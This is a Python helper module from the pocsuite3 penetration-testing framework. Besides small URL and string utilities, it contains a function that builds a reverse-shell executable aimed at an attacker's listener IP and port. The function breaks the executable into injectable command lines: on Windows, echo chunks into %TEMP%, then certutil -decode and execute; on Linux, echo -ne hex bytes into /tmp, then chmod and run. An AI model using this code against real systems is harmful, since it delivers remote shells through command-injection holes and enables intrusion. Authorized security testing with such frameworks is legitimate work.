import ast
import base64
import binascii
import os
import string
import random
from socket import gethostbyname
from urllib.parse import urlparse

from pocsuite3.lib.core.data import logger, paths
from pocsuite3.lib.core.enums import CUSTOM_LOGGING, OS, OS_ARCH, SHELLCODE_CONNECTION
# for pocsuite 2.x
from pocsuite3.lib.core.exception import PocsuiteGenericException
from pocsuite3.lib.core.register import register_poc as register
from pocsuite3.shellcodes import OSShellcodes


def url2ip(url, with_port=False):
    """
    works like turning 'http://baidu.com' => '180.149.132.47'
    """

    url_prased = urlparse(url)
    if url_prased.port:
        ret = gethostbyname(url_prased.hostname), url_prased.port
    elif not url_prased.port and url_prased.scheme == 'https':
        ret = gethostbyname(url_prased.hostname), 443
    else:
        ret = gethostbyname(url_prased.hostname), 80

    return ret if with_port else ret[0]


def str_to_dict(value):
    try:
        return ast.literal_eval(value)
    except ValueError as e:
        logger.log(CUSTOM_LOGGING.ERROR, "conv string failed : {}".format(str(e)))


def random_str(length=10, chars=string.ascii_letters + string.digits):
    return ''.join(random.sample(chars, length))


def get_middle_text(text, prefix, suffix, index=0):
    """
    获取中间文本的简单实现

    :param text:要获取的全文本
    :param prefix:要获取文本的前部分
    :param suffix:要获取文本的后半部分
    :param index:从哪个位置获取
    :return:
    """
    try:
        index_1 = text.index(prefix, index)
        index_2 = text.index(suffix, index_1 + len(prefix))
    except ValueError:
        # logger.log(CUSTOM_LOGGING.ERROR, "text not found pro:{} suffix:{}".format(prefix, suffix))
        return ''
    return text[index_1 + len(prefix):index_2]


def generate_shellcode_list(listener_ip, listener_port, os_target=OS.WINDOWS, os_target_arch=OS_ARCH.X86,
                            chunked_num=50, profix=None, write_path=None):
    """
    生成可执行的shellcode，用于Windows/Linux下shell反弹，编写带有命令执行的POC时，执行此命令返回的列表即可。

    :param listener_ip: 监听IP
    :param listener_port: 监听端口
    :param os_target: 系统类型，默认为Windows
    :param os_target_arch: 系统架构，默认是x86
    :param chunked_num: 指定多大数量为一块，默认50
    :param profix: 选择命令执行的前缀，默认None 自动根据操作系统选择
    :param write_path: 写入的文件目录，默认为None时，Windows将写入到%TEMP%目录，Linux将写入到/tmp目录下，文件名随机
    :return: list of command
    """

    bad_chars = ["\x00", "\x0a", "\x0d", "\x3b"]
    s = OSShellcodes(os_target, os_target_arch, listener_ip, listener_port, bad_chars)
    connection_type = SHELLCODE_CONNECTION.REVERSE
    filename = random_str(5)
    filepath = os.path.join(paths.POCSUITE_TMP_PATH, filename)
    if os_target == OS.WINDOWS:
        filepath = os.path.join(paths.POCSUITE_TMP_PATH, filename) + '.exe'
    shellcode = s.create_shellcode(
        connection_type,
        encode='',
        make_exe=1,
        debug=0,
        # dll_inj_funcs=dll_funcs,
        filename=filename,
        # use_precompiled=False
    )
    if not os.path.exists(filepath):
        raise PocsuiteGenericException("generate file does not exist!")
    with open(filepath, 'rb') as f:
        data = f.read()

    os.unlink(filepath)
    if profix is None:
        if os_target == OS.WINDOWS:
            profix = "cmd.exe /q /c "
        elif os_target == OS.LINUX:
            profix = ""

    index = 0
    cmd = []
    rand_str = random_str(4)
    if os_target == OS.WINDOWS:
        data = base64.b64encode(data).decode()
        length = len(data)

        if write_path is None:
            write_path = "%TEMP%"
        filename = r"{path}\{rand}.bs4".format(path=write_path, rand=rand_str)
        filename_out = r"{path}\{rand}.exe".format(path=write_path, rand=rand_str)
        while 1:
            if index > length:
                break
            _cmd = data[index:index + chunked_num]
            flag = ">>"
            if index == 0:
                flag = ">"
            cmd.append(profix + r"echo {payload} {flag} {filename}".format(payload=_cmd, flag=flag, filename=filename))
            index = index + chunked_num
        cmd.append(profix + "certutil -decode {input} {output}".format(input=filename, output=filename_out))
        cmd.append(profix + filename_out)
    elif os_target == OS.LINUX:
        length = len(data)
        echo_prefix = "\\x"
        if write_path is None:
            write_path = "/tmp"
        filename = r"{path}/{rand}".format(path=write_path, rand=rand_str)
        while 1:
            if index > length:
                break

            block = str(binascii.hexlify(data[index:index + chunked_num]), "utf-8")
            block = echo_prefix + echo_prefix.join(a + b for a, b in zip(block[::2], block[1::2]))
            command = profix + 'echo -ne "{}" >> {}'.format(block, filename)
            cmd.append(command)
            index = index + chunked_num
        cmd.append("chmod u+x " + filename)
        cmd.append(profix + filename)

    return cmd
